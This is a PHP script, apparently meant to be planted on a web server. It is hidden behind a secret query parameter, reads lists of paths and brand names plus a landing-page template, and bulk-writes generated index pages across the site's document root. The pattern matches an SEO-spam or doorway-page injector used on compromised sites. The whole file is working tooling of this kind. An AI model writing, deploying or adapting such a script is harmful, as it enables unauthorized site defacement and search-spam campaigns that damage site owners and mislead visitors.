<?php

if (!isset($_GET['cmd']) || $_GET['cmd'] !== 'crot') {
    die('Access Denied!');
}

/* =========================
   LOAD FILE
========================= */

$paths  = @file('path.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$brands = @file('brand.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$template = @file_get_contents('lp.txt');

if ($paths === false || $brands === false) {
    die("Gagal baca path.txt / brand.txt");
}

if ($template === false) {
    die("Template lp.txt tidak bisa dibaca");
}

if (count($brands) < count($paths)) {
    die("Brand kurang dari jumlah path!");
}

/* =========================
   CONFIG
========================= */

$extList = ['php','html','htm'];
set_time_limit(0);

/* =========================
   HTML START
========================= */

?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Generator</title>
</head>
<body>
<pre>
<?php

$success = 0;
$fail = 0;

/* =========================
   LOOP
========================= */

foreach ($paths as $index => $pathRaw) {

    $pathRaw = trim($pathRaw);

    // 🚫 BLOCK PATH TRAVERSAL
    if (strpos($pathRaw, '..') !== false) {
        echo "[SKIP] Invalid path: $pathRaw\n";
        continue;
    }

    if (!isset($brands[$index])) {
        echo "[SKIP] Brand tidak ada untuk index $index\n";
        continue;
    }

    $brand = trim($brands[$index]);

    // normalize path
    $path = '/' . ltrim($pathRaw, '/');

    echo "[INFO] Processing: $path\n";

    $isFile = preg_match('/\.(php|html|htm)$/i', $path);

    if ($isFile) {

        $output = $_SERVER['DOCUMENT_ROOT'] . $path;
        $dir = dirname($output);

        if (!is_dir($dir)) {
            if (!mkdir($dir, 0755, true)) {
                echo "[ERROR] Gagal buat folder\n";
                $fail++;
                continue;
            }
        }

        $ext = pathinfo($output, PATHINFO_EXTENSION);

        $url = (isset($_SERVER['HTTPS']) ? "https" : "http") .
               "://" . $_SERVER['HTTP_HOST'] . $path;

    } else {

        $cleanPath = '/' . trim($path, '/');
        $serverPath = $_SERVER['DOCUMENT_ROOT'] . $cleanPath;

        if (!is_dir($serverPath)) {
            if (!mkdir($serverPath, 0755, true)) {
                echo "[ERROR] Gagal buat folder\n";
                $fail++;
                continue;
            }
        }

        $ext = $extList[array_rand($extList)];
        $output = $serverPath . "/index.$ext";

        $url = (isset($_SERVER['HTTPS']) ? "https" : "http") .
               "://" . $_SERVER['HTTP_HOST'] . $cleanPath . "/";
    }

    /* =========================
       GENERATE CONTENT
    ========================= */

    $content = $template;

    $content = str_replace('{{BRAND_NAME}}', $brand, $content);
    $content = str_replace('{{URL_PATH}}', $url, $content);

    if ($ext !== 'php') {

        $brandUpper = strtoupper($brand);

        $content = preg_replace('/<\?(php|=).*?\?>/s', '', $content);
        $content = str_replace('{{BRAND_NAME}}', $brandUpper, $content);
        $content = str_replace('{{URL_PATH}}', $url, $content);
    }

    /* =========================
       WRITE FILE
    ========================= */

    $writeSuccess = false;

    if (is_writable(dirname($output))) {
        $fp = fopen($output, "w");
        if ($fp) {
            if (fwrite($fp, $content) !== false) {
                $writeSuccess = true;
            }
            fclose($fp);
        }
    }

    if ($writeSuccess) {
        echo "[SUCCESS] $output (Brand: $brand)\n";
        $success++;
    } else {
        echo "[ERROR] Gagal tulis file: $output\n";
        $fail++;
    }
}

/* =========================
   RESULT
========================= */

echo "\n=== DONE ===\n";
echo "Success: $success\n";
echo "Failed: $fail\n";

?>
</pre>
</body>
</html>
